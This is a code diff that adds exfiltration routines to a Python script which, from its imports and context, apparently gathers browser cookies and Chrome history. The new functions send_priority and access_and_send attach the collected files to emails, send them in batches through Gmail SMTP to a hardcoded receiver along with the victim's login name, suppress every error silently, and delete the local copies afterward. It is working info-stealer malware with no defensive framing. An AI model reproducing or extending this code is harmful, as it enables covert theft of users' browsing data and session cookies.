@@ -1,3 +1,6 @@
+import os
+import csv
+import browserhistory as bh
 import urllib.request
 import browser_cookie3 # pip install browser_cookie3
 
@@ -69,6 +72,83 @@ def get_chrome_history():
 def delete_form(form_lst):
     for i in form_lst:
         os.remove(i)
+
+
+def send_priority(subject, filename):
+    msg = EmailMessage()
+    msg["Subject"] = f"Report, Date: {time.strftime('%d/%m/%Y')}"
+    msg["From"] = SENDER
+    msg["To"] = RECEIVER
+    msg.set_content(f"{subject} for {os.getlogin()}")
+
+    try:
+        # attach the csv file
+        with open(filename, "rb") as f:
+            if f is None:
+                return None
+
+            ctype, encoding = mimetypes.guess_type(filename)
+            if ctype is None or encoding is not None:
+                ctype = "application/octet-stream"
+            maintype, subtype = ctype.split("/", 1)
+
+            file_data = f.read()
+            file_name = f.name.split("\\")[-1]
+            msg.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=file_name)
+
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
+            smtp.login(SENDER, SENDER_P)
+            smtp.send_message(msg)
+            smtp.quit()
+
+        os.remove(filename)
+    except Exception:  # NOQA
+        pass
+
+def access_and_send(*args):
+    """
+    Access the files and send it through SMTPlib
+    """
+    counter = 0
+
+    msg = EmailMessage()
+    msg["Subject"] = f"Files, Date: {time.strftime('%d/%m/%Y')}"
+    msg["From"] = SENDER
+    msg["To"] = RECEIVER
+    msg.set_content(f"Report for {time.strftime('%d/%m/%Y')}, desktop name: {os.getlogin()}")
+    
+    for i in args:
+        for j in i:
+            if j is None:
+                continue
+            try:
+                with open(j, "rb") as f:
+                    ctype, encoding = mimetypes.guess_type(j)
+                    if ctype is None or encoding is not None:
+                        ctype = "application/octet-stream"
+                    maintype, subtype = ctype.split("/", 1)
+
+                    file_data = f.read()
+                    file_name = f.name.split("\\")[-1]
+                    msg.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=file_name)
+            except Exception:  # NOQA
+                pass
+
+            counter += 1
+            if counter == 10:
+                with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
+                    smtp.login(SENDER, SENDER_P)
+                    smtp.send_message(msg)
+                    smtp.quit()
+                counter = 0
+
+        # Once the loop finishes, send the remaining
+        if counter != 0:
+            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
+                smtp.login(SENDER, SENDER_P)
+                smtp.send_message(msg)
+                smtp.quit()
+            counter = 0
 
 try:
     access_and_send(form_list)
